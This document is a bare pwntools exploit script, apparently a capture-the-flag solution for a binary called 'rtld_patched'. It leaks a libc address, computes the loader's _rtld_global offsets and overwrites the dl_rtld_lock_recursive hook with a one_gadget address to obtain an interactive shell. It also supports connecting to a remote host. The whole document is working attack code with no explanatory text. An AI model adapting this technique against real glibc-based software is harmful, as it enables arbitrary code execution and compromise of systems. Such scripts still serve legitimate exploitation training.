from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './rtld_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF("libc.so.6")
p.recvuntil(b'stdout: ')
leak = int(p.recvuntil(b'\n').decode('utf-8'), 16)
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
info("libc_base: %#x" % libc.address)
ld_base = libc.address + 0x3ca000
info("ld_base: %#x" % ld_base)

rtld_global = ld_base + 0x226040
info("rtld_global: %#x" % rtld_global)
rtld_recursive = rtld_global + 3848
info("rtld_recursive: %#x" % rtld_recursive)
rtld_load_lock = rtld_global + 2312
info("rtld_load_lock: %#x" % rtld_load_lock)
one_gadget = libc.address + 0x4526a
p.sendlineafter(b'addr: ', str(rtld_recursive).encode())
p.sendlineafter(b'value: ', str(one_gadget).encode())

p.interactive()
